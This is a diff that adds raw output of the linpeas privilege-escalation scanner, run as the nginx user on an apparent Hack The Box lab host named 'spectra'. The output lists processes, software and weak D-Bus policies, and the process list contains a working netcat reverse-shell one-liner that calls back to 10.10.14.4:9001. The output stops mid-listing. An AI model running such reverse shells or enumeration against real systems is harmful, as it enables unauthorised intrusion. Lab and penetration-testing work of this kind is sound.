@@ -1,0 +1,2492 @@
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+        ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+              ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |                                
+       |---------------------------------------------------------------------------|                                
+       |         Become a Patreon    :     https://www.patreon.com/peass           |                                
+       |         Follow on Twitter   :     @carlospolopm                           |                                
+       |         Respect on HTB      :     SirBroccoli & makikvues                 |                                
+       |---------------------------------------------------------------------------|                                
+       |                                 Thank you!                                |                                
+       \---------------------------------------------------------------------------/                                
+  linpeas-ng by carlospolop                                                                                         
+                                                                                                                    
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                    
+                                                                                                                    
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:                                                                                                            
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 5.4.66+ (neverware@cloudready-builder) (Chromium OS 11.0_pre399094_p20200824-r6 clang version 11.0.0 (/var/tmp/portage/sys-devel/llvm-11.0_pre399094_p20200824-r6/work/llvm-11.0_pre399094_p20200824/clang 83080a294ad7d145d758821bcf4354ad0cb7d299)) #1 SMP Tue Dec 22 13:39:49 UTC 2020
+User & Groups: uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
+Hostname: spectra
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[-] No port scan capabilities (nc not found)                                                                        
+                                                                                                                    
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
+DONE
+                                                                                                                    
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+╔══════════╣ Operative system                                                                                       
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                       
+Linux version 5.4.66+ (neverware@cloudready-builder) (Chromium OS 11.0_pre399094_p20200824-r6 clang version 11.0.0 (/var/tmp/portage/sys-devel/llvm-11.0_pre399094_p20200824-r6/work/llvm-11.0_pre399094_p20200824/clang 83080a294ad7d145d758821bcf4354ad0cb7d299)) #1 SMP Tue Dec 22 13:39:49 UTC 2020
+lsb_release Not Found
+                                                                                                                    
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                          
+Sudo version 1.8.32                                                                                                 
+
+╔══════════╣ USBCreator
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                              
+                                                                                                                    
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                  
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                        
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+╔══════════╣ Date & uptime
+Sun Jul 18 14:22:48 PDT 2021                                                                                        
+ 14:22:48 up 19 min,  0 users,  load average: 0.28, 0.08, 0.09
+
+╔══════════╣ System stats
+Filesystem               Size  Used Avail Use% Mounted on                                                           
+/dev/root                2.9G  2.7G  185M  94% /
+devtmpfs                 2.0G     0  2.0G   0% /dev
+tmp                      2.0G  136K  2.0G   1% /tmp
+run                      2.0G  924K  2.0G   1% /run
+shmfs                    2.0G  2.0M  2.0G   1% /dev/shm
+/dev/sda16                25G  3.1G   21G  14% /mnt/stateful_partition
+/dev/sda23               976M  2.6M  958M   1% /usr/share/oem
+/dev/mapper/encstateful  7.2G   69M  7.2G   1% /mnt/stateful_partition/encrypted
+media                    2.0G     0  2.0G   0% /media
+none                     2.0G     0  2.0G   0% /sys/fs/cgroup
+tmpfs                    2.0G     0  2.0G   0% /run/chromeos-config/private
+imageloader              2.0G     0  2.0G   0% /run/imageloader
+/dev/loop1                92M   92M     0 100% /usr/share/chromeos-assets/speech_synthesis/patts
+              total        used        free      shared  buff/cache   available
+Mem:        4005696      479840     2662852        3040      863004     3087528
+Swap:       5867716           0     5867716
+
+╔══════════╣ CPU info
+Architecture:                    x86_64                                                                             
+CPU op-mode(s):                  32-bit, 64-bit
+Byte Order:                      Little Endian
+Address sizes:                   43 bits physical, 48 bits virtual
+CPU(s):                          4
+On-line CPU(s) list:             0-3
+Thread(s) per core:              1
+Core(s) per socket:              1
+Socket(s):                       4
+Vendor ID:                       AuthenticAMD
+CPU family:                      23
+Model:                           1
+Model name:                      AMD EPYC 7401P 24-Core Processor
+Stepping:                        2
+CPU MHz:                         2000.000
+BogoMIPS:                        4000.00
+Hypervisor vendor:               VMware
+Virtualization type:             full
+L1d cache:                       128 KiB
+L1i cache:                       256 KiB
+L2 cache:                        2 MiB
+L3 cache:                        256 MiB
+Vulnerability Itlb multihit:     Not affected
+Vulnerability L1tf:              Not affected
+Vulnerability Mds:               Not affected
+Vulnerability Meltdown:          Not affected
+Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl and seccomp
+Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
+Vulnerability Spectre v2:        Mitigation; Full AMD retpoline, IBPB conditional, STIBP disabled, RSB filling
+Vulnerability Srbds:             Not affected
+Vulnerability Tsx async abort:   Not affected
+Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+╔══════════╣ Environment
+╚ Any private information inside environment variables?                                                             
+HISTSIZE=0                                                                                                          
+HISTFILESIZE=0
+USER=nginx
+PWD=/dev/shm
+SHLVL=1
+HOME=/home/nginx
+HISTFILE=/dev/null
+_=/usr/bin/env
+
+╔══════════╣ Searching Signature verification failed in dmseg
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                   
+[    3.486215] cfg80211: loaded regulatory.db is malformed or signature is missing/invalid                          
+
+╔══════════╣ Linux Protections
+═╣ AppArmor enabled? .............. AppArmor Not Found                                                              
+═╣ grsecurity present? ............ grsecurity Not Found                                                            
+═╣ PaX bins present? .............. PaX Not Found                                                                   
+═╣ Execshield enabled? ............ Execshield Not Found                                                            
+═╣ SELinux enabled? ............... sestatus Not Found                                                              
+═╣ Is ASLR enabled? ............... Yes                                                                             
+═╣ Printer? ....................... lpstat Not Found
+═╣ Is this a virtual machine? ..... Yes                                                                             
+
+════════════════════════════════════╣ Containers ╠════════════════════════════════════
+╔══════════╣ Container related tools present                                                                        
+╔══════════╣ Container details                                                                                      
+═╣ Is this a container? ........... No                                                                              
+═╣ Any running containers? ........ No                                                                              
+                                                                                                                    
+════════════════════════════════════╣ Devices ╠════════════════════════════════════
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)                                                                 
+disk                                                                                                                
+sda
+sda1
+sda10
+sda11
+sda12
+sda13
+sda14
+sda15
+sda16
+sda17
+sda18
+sda19
+sda2
+sda20
+sda21
+sda22
+sda23
+sda24
+sda25
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount umounted devices                                                                           
+                                                                                                                    
+╔══════════╣ Mounted disks information
+diskutil Not Found                                                                                                  
+                                                                                                                    
+╔══════════╣ Mounted SMB Shares
+smbutil Not Found                                                                                                   
+                                                                                                                    
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+╔══════════╣ Useful software                                                                                        
+/usr/local/bin/wget                                                                                                 
+/usr/local/bin/curl
+/bin/ping
+/usr/local/bin/gcc
+/usr/local/bin/g++
+/usr/local/bin/make
+/usr/local/bin/gdb
+/usr/bin/base64
+/usr/local/bin/python
+/usr/local/bin/python2
+/usr/local/bin/python3
+/usr/local/bin/python2.7
+/usr/bin/python3.6
+/usr/local/bin/perl
+/usr/local/bin/php
+/usr/local/bin/ruby
+/usr/bin/sudo
+
+╔══════════╣ Installed Compiler
+/usr/local/bin/gcc                                                                                                  
+/usr/local/bin/g++
+
+
+════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════                                                                                                                 
+╔══════════╣ Cleaned processes                                                                                      
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                  
+root          1  0.0  0.0  12596  3936 ?        Ss   14:02   0:01 /sbin/init                                        
+root        235  0.1  0.1  16728  4296 ?        Ss   14:02   0:01 udevd --daemon[0m
+syslog      558  0.0  0.1  35964  7316 ?        S    14:02   0:00 /usr/lib/systemd/systemd-journald
+  └─(Caps) 0x0000002400000000=cap_syslog,cap_audit_read
+message+    662  0.0  0.0   9896  2896 ?        Ss   14:02   0:00 dbus-daemon --system --fork
+syslog      671  0.0  0.0 299140  3684 ?        Sl   14:02   0:00 /usr/sbin/rsyslogd -n -f /etc/rsyslog.chromeos -i /tmp/rsyslogd.pid                                                                                                   
+root        713  0.0  0.0   4372   832 ?        Ss   14:02   0:00 /bin/sh -e /proc/self/fd/9
+root        764  0.0  0.0   7344  2580 ?        S    14:02   0:00  _ bash /mnt/stateful_partition/rc.local
+root        772  0.0  0.0   7344  2540 ?        S    14:02   0:00      _ /bin/bash /root/script.sh
+root       1268  0.0  0.0   4372  1772 ?        S    14:02   0:00          _ /bin/sh /usr/local/bin/mysqld_safe --bind-address=0.0.0.0 --user=chronos
+chronos    3750  0.5  5.0 1599332 202680 ?      Sl   14:05   0:05          |   _ /usr/local/bin/mysqld --basedir=/usr/local --datadir=/usr/local/data --plugin-dir=/usr/local/lib/mysql/plugin --user=chronos --bind-address=0.0.0.0 --log-error=spectra.err --pid-file=spectra.pid
+root       1269  0.1  0.1 248808  5712 ?        Sl   14:02   0:01          _ /usr/local/bin/vmtoolsd
+root       4446  0.0  0.0   9404  1116 ?        S    14:22   0:00          _ /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 60
+wpa         758  0.0  0.1  17284  4400 ?        S    14:02   0:00 /usr/sbin/wpa_supplicant -u -s -O/run/wpa_supplicant
+  └─(Caps) 0x0000000000003000=cap_net_admin,cap_net_raw
+root        793  0.0  0.0  20072   564 ?        Ss   14:02   0:00 /usr/sbin/sshd
+chaps       799  0.0  0.2 101968 10572 ?        SLsl 14:02   0:00 /opt/tpm1/sbin/chapsd --auto_load_system_token
+root        812  0.0  0.1 101144  7560 ?        Ssl  14:02   0:00 /opt/tpm1/sbin/tpm_managerd --wait_for_ownership_trigger
+root        909  0.0  0.3 407200 12236 ?        SLsl 14:02   0:00 /opt/tpm1/sbin/cryptohomed --noclose --direncryption --vmodule=
+root        912  0.0  0.0  16204   412 ?        Ss   14:02   0:00 nginx: master process nginx
+nobody      914  0.0  0.0  16672  3416 ?        S    14:02   0:00  _ nginx: worker process
+shill      1182  0.0  0.3  34292 13424 ?        S    14:02   0:00 /usr/bin/shill --log-level=0 --log-scopes= --vmodule=object_proxy=0,dbus_object=0,bus=0
+  └─(Caps) 0x0000000800003de0=cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_wake_alarm
+syslog     1215  0.0  0.0   6540   992 ?        S    14:02   0:00  _ /usr/bin/logger --priority daemon err --tag /usr/bin/shill
+  └─(Caps) 0x0000000800003de0=cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_wake_alarm
+dhcp       2558  0.0  0.0  11264  1228 ?        S    14:03   0:00  _ /sbin/dhcpcd -B -q -4 eth0=ethernet_any
+  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+root       1232  0.0  0.2 102928  8932 ?        Ss   14:02   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
+nginx      1246  0.1  1.1 206868 45344 ?        S    14:02   0:01  _ php-fpm: pool www
+nginx      1247  0.1  1.1 132080 44072 ?        S    14:02   0:01  _ php-fpm: pool www
+nginx      3825  0.0  0.0   4372   872 ?        S    14:08   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 9001
+nginx      3828  0.0  0.0   9404  1052 ?        S    14:08   0:00  |       _ /usr/bin/coreutils --coreutils-prog-shebang=cat /bin/cat /tmp/f
+nginx      3829  0.0  0.0   4372   880 ?        S    14:08   0:00  |       _ /bin/sh -i
+nginx      3671  0.0  0.4 104356 17468 ?        S    14:05   0:00  _ php-fpm: pool www
+nginx      3995  0.0  0.0   4372   760 ?        S    14:12   0:00      _ /bin/sh -i
+nginx      4152  0.3  0.0   8360  3712 ?        S    14:22   0:00          _ bash linpeas.sh
+nginx      5206  0.0  0.0   8360  2568 ?        S    14:22   0:00              _ bash linpeas.sh
+nginx      5209  0.0  0.0   9616  2480 ?        R    14:22   0:00              |   _ ps fauxwww
+nginx      5210  0.0  0.0   8360  1356 ?        S    14:22   0:00              _ bash linpeas.sh
+attesta+   1710  0.0  0.2 177440  8512 ?        SLsl 14:03   0:00 /opt/tpm1/sbin/attestationd
+root       1835  0.0  0.3  38560 14552 ?        S    14:03   0:00 python2.7 /opt/neverware/install_service.py
+root       1927  0.0  0.1  19352  5880 ?        Ss   14:03   0:00 periodic_scheduler --period=3600 --timeout=14400 --start_immediately --task_name=crash_sender -- /sbin/crash_sender
+root       1930  0.0  0.1  20672  7996 ?        Ss   14:03   0:00 /usr/bin/patchpaneld
+patchpa+   1936  0.0  0.1  22636  7400 ?        Ss   14:03   0:00  _ /usr/bin/patchpaneld --adb_proxy_fd=4
+  └─(Caps) 0x0000000000002000=cap_net_raw
+patchpa+   1937  0.0  0.1  22632  7392 ?        Ss   14:03   0:00  _ /usr/bin/patchpaneld --mcast_proxy_fd=6
+  └─(Caps) 0x0000000000002000=cap_net_raw
+patchpa+   1938  0.0  0.1  22636  7544 ?        Ss   14:03   0:00  _ /usr/bin/patchpaneld --nd_proxy_fd=8
+  └─(Caps) 0x0000000000002000=cap_net_raw
+root       1948  0.0  0.2  29496  9212 ?        Ss   14:03   0:00 neverware_daemon[0m
+root       1992  0.0  0.0  19352  3256 ?        Ss   14:03   0:00 periodic_scheduler --period=3600 --timeout=600 --task_name=update_userdataauth -- /usr/libexec/cryptohome/update_userdataauth_from_features.sh
+devbrok+   1993  0.0  0.1  24948  7064 ?        S    14:03   0:00 /usr/bin/permission_broker
+  └─(Caps) 0x000000000000300b=cap_chown,cap_dac_override,cap_fowner,cap_net_admin,cap_net_raw
+root       2012  0.0  0.0   8612  1912 ?        Ss   14:03   0:00 minijail0 -u cras -g cras -G --uts -v -l -T static -P /mnt/empty -b / / -k tmpfs /run tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /run/cras /run/cras 1 -b /run/dbus /run/dbus 1 -b /run/systemd/journal -b /run/udev /run/udev -b /dev /dev -b /dev/shm /dev/shm 1 -k proc /proc proc -b /sys /sys -k tmpfs /var tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /var/lib/metrics/ /var/lib/metrics/ 1 -- /sbin/minijail0 -n -S /usr/share/policy/cras-seccomp.policy -- /usr/bin/cras --disable_profile=hsp
+cras       2080  0.0  0.0   6648  1904 ?        S    14:03   0:00  _ /sbin/minijail0 -n -S /usr/share/policy/cras-seccomp.policy -- /usr/bin/cras --disable_profile=hsp
+avahi      2065  0.0  0.0  11484   224 ?        S    14:03   0:00  _ avahi-daemon: chroot helper
+modem      2035  0.0  0.1 243092  6880 ?        Sl   14:03   0:00 /usr/sbin/ModemManager --log-level=INFO
+  └─(Caps) 0x0000000000200000=cap_sys_admin
+root       2050  0.0  0.2  34428 10588 ?        Ss   14:03   0:00 update_engine
+root       2115  0.0  0.0  19352  3356 ?        Ss   14:03   0:00 periodic_scheduler --period=86400 --timeout=600 --task_name=cleanup_logs -- /usr/sbin/chromeos-cleanup-logs
+root       2143  0.0  0.0   8992   252 ?        S    14:03   0:00 upstart-socket-bridge --daemon[0m
+root       2616  0.0  0.0  19352  3388 ?        Ss   14:03   0:00 periodic_scheduler --period=3600 --timeout=60 --task_name=cros-machine-id-regen -- /usr/sbin/cros-machine-id-regen -r periodic -t 21600
+root       2724  0.0  0.0   8744  1964 ?        Ss   14:03   0:00 /sbin/minijail0 -u bluetooth -g bluetooth -G -c 3500 -n -- /usr/libexec/bluetooth/bluetoothd  --nodetach --configfile=/etc/bluetooth/main.conf --experimental
+bluetoo+   2735  0.0  0.1  27616  7952 ?        S    14:03   0:00  _ /usr/libexec/bluetooth/bluetoothd  --nodetach --configfile=/etc/bluetooth/main.conf --experimental
+  └─(Caps) 0x0000000000003500=cap_setpcap,cap_net_bind_service,cap_net_admin,cap_net_raw
+root       2731  0.0  0.0   8612   160 ?        S    14:03   0:00 /sbin/minijail0 -T static --profile=minimalistic-mountns -i -p -v -r --uts -l -g syslog --mount-dev -b /dev/log -b /sys -k /var /var tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /var/log -b /var/spool  1 -b /var/lib/metrics  1 -b /var/lib/whitelist -k /run /run tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /run/crash_reporter  1 -b /run/dbus -b /home/chronos -- /usr/bin/anomaly_detector
+root       2760  0.1  0.2  26996 10152 ?        S    14:03   0:02  _ /usr/bin/anomaly_detector
+root       2745  0.0  0.0   8744   196 ?        S    14:03   0:00 minijail0 -u bluetooth -g bluetooth -G -i -n -l -p -v -r -t --uts -e --profile minimalistic-mountns -k /run /run tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -k /var /var tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -k /sys /sys tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /run/chromeos-config/v1 -b /dev/log /dev/log 1 -b /run/dbus -b /var/lib/bluetooth  1 -b /sys/devices/virtual/dmi/id -- /usr/bin/btdispatch --vmodule=
+bluetoo+   2759  0.0  0.1  21632  5940 ?        S    14:03   0:00  _ /usr/bin/btdispatch --vmodule=
+root       2769  0.0  0.0   6648   192 ?        S    14:03   0:00 minijail0 -i -p -v -r --uts -l --profile minimalistic-mountns -b /dev/log -b /dev/rtc -k /run /run tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /run/dbus  1 -b /run/shill -k /var /var tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /var/cache/tlsdated  1 /usr/bin/tlsdated -- /usr/bin/tlsdate -v -C /usr/share/chromeos-ca-certificates -l
+tlsdate    2777  0.0  0.0  15588  3348 ?        S    14:03   0:00  _ /usr/bin/tlsdated -- /usr/bin/tlsdate -v -C /usr/share/chromeos-ca-certificates -l
+root       2820  0.0  0.0  13492   412 ?        S    14:03   0:00      _ /usr/bin/tlsdated -- /usr/bin/tlsdate -v -C /usr/share/chromeos-ca-certificates -l
+root       2776  0.0  0.0   4372  1592 ?        Ss   14:03   0:00 /bin/sh /usr/share/cros/init/activate_date.sh
+root       4123  0.0  0.0   9404  1112 ?        S    14:20   0:00  _ /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 200
+metrics    3091  0.0  0.2  29196  9596 ?        S    14:03   0:00 /usr/bin/metrics_daemon --nodaemon
+root       3099  0.0  0.0   6648   204 ?        S    14:03   0:00 minijail0 --profile minimalistic-mountns -b /dev/log -b /dev/chromeos-low-mem -b /sys -k /var /var tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /var/log/memd  1 -k /run /run tmpfs MS_NODEV MS_NOEXEC MS_NOSUID mode=755,size=10M -b /run/dbus --uts -p -e -n -l -S /usr/share/policy/memd-seccomp.policy -i -- /usr/bin/memd
+root       3104  0.0  0.0  11568  2452 ?        S    14:03   0:00  _ /usr/bin/memd
+root       3707  0.0  0.2  30340 10516 ?        Ss   14:05   0:00 /usr/bin/cros_healthd
+cros_he+   3712  0.0  0.1  32436  5680 ?        S    14:05   0:00  _ /usr/bin/cros_healthd
+
+╔══════════╣ Binary processes permissions
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                             
+-rwxr-xr-x 1 root    root      551984 Dec 22  2020 /bin/bash                                                        
+lrwxrwxrwx 1 root    root           4 Dec 22  2020 /bin/sh -> dash
+-rwxr-xr-x 1 root    root      611344 Jan 15  2021 /opt/tpm1/sbin/attestationd
+-rwxr-xr-x 1 root    root      480416 Jan 15  2021 /opt/tpm1/sbin/chapsd
+-rwxr-xr-x 1 root    root     1546944 Jan 15  2021 /opt/tpm1/sbin/cryptohomed
+-rwxr-xr-x 1 root    root      218472 Jan 15  2021 /opt/tpm1/sbin/tpm_managerd
+-r-xr-xr-x 1 root    root      217064 Dec 22  2020 /sbin/dhcpcd
+-rwxr-xr-x 1 root    root      131408 Dec 22  2020 /sbin/init
+-rwxr-xr-x 1 root    root      134840 Jan 15  2021 /sbin/minijail0
+-rwxr-xr-x 1 root    root       88192 Jan 15  2021 /usr/bin/anomaly_detector
+-rwxr-xr-x 1 root    root       49496 Jan 15  2021 /usr/bin/btdispatch
+-rwxr-xr-x 1 root    root      901528 Dec 22  2020 /usr/bin/coreutils
+-rwxr-xr-x 1 root    root      745448 Jan 15  2021 /usr/bin/cros_healthd
+-rwxr-xr-x 1 root    root       26696 Dec 22  2020 /usr/bin/logger
+-rwxr-xr-x 1 root    root      455712 Jan 15  2021 /usr/bin/memd
+-rwxr-xr-x 1 root    root      240072 Jan 15  2021 /usr/bin/metrics_daemon
+-rwxr-xr-x 1 root    root      391256 Jan 15  2021 /usr/bin/patchpaneld
+-rwxr-xr-x 1 root    root      112032 Jan 15  2021 /usr/bin/permission_broker
+-rwxr-xr-x 1 root    root     2021408 Jan 15  2021 /usr/bin/shill
+-rwxr-xr-x 1 root    root       46248 Dec 22  2020 /usr/bin/tlsdated
+-rwxr-xr-x 1 root    root      127832 Dec 22  2020 /usr/lib/systemd/systemd-journald
+-rwxr-xr-x 1 root    root      736952 Dec 22  2020 /usr/libexec/bluetooth/bluetoothd
+-rwxr-xr-x 1 chronos chronos 24561680 Jun 29  2020 /usr/local/bin/mysqld
+-rwxr-xr-x 1 root    root      259976 Feb 11 10:24 /usr/local/bin/vmtoolsd
+-rwxr-xr-x 1 root    root      945536 Dec 22  2020 /usr/sbin/ModemManager
+-rwxr-xr-x 1 root    root      549928 Dec 22  2020 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root    root      585080 Dec 22  2020 /usr/sbin/sshd
+-rwxr-xr-x 1 root    root     1306176 Dec 22  2020 /usr/sbin/wpa_supplicant
+
+╔══════════╣ Files opened by processes belonging to other users
+╚ This is usually empty because of the lack of privileges to read other user processes information                  
+COMMAND    PID  TID TASKCMD           USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                               
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                       
+gdm-password Not Found                                                                                              
+gnome-keyring-daemon Not Found                                                                                      
+lightdm Not Found                                                                                                   
+vsftpd Not Found                                                                                                    
+apache2 Not Found                                                                                                   
+sshd Not Found                                                                                                      
+                                                                                                                    
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                   
+crontab Not Found                                                                                                   
+incrontab Not Found                                                                                                 
+                                                                                                                    
+╔══════════╣ Services
+╚ Search for outdated versions                                                                                      
+service|chkconfig|rc-status|launchctl Not Found                                                                     
+                                                                                                                    
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                           
+                                                                                                                    
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                              
+You can't write on systemd PATH                                                                                     
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                
+                                                                                                                    
+╔══════════╣ Analyzing .timer files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                
+                                                                                                                    
+╔══════════╣ Analyzing .socket files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                               
+                                                                                                                    
+╔══════════╣ HTTP sockets
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                               
+                                                                                                                    
+╔══════════╣ D-Bus config files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                 
+Possible weak user policy found on /etc/dbus-1/system.d/BootLockbox.conf (  <policy user="bootlockboxd">)           
+Possible weak user policy found on /etc/dbus-1/system.d/Cryptohome.conf (  <policy user="cryptohome">
+  <policy user="authpolicyd">
+  <policy user="chronos">
+  <policy user="power">
+  <policy user="arc-keymasterd">
+  <policy user="cdm-oemcrypto">)
+Possible weak user policy found on /etc/dbus-1/system.d/ImageBurner.conf (  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/SessionManager.conf (  <policy user="arc-keymasterd">
+  <policy user="crosvm">
+  <policy user="authpolicyd">
+  <policy user="chronos">
+  <policy user="devbroker">
+  <policy user="crash">
+  <policy user="vm_cicerone">
+  <policy user="kerberosd">
+  <policy user="dlcservice">
+  <policy user="power">
+  <policy user="biod">
+  <policy user="u2f">
+  <policy user="cdm-oemcrypto">)
+Possible weak user policy found on /etc/dbus-1/system.d/UpdateEngine.conf (  <policy user="chronos">
+  <policy user="power">
+  <policy user="dlcservice">)
+Possible weak user policy found on /etc/dbus-1/system.d/UsbBouncer.conf (  <policy user="usb_bouncer">)
+Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)
+Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
+Possible weak user policy found on /etc/dbus-1/system.d/dhcpcd.conf (  <policy user="dhcp">)
+Possible weak user policy found on /etc/dbus-1/system.d/fi.w1.wpa_supplicant1.conf (        <policy user="wpa">
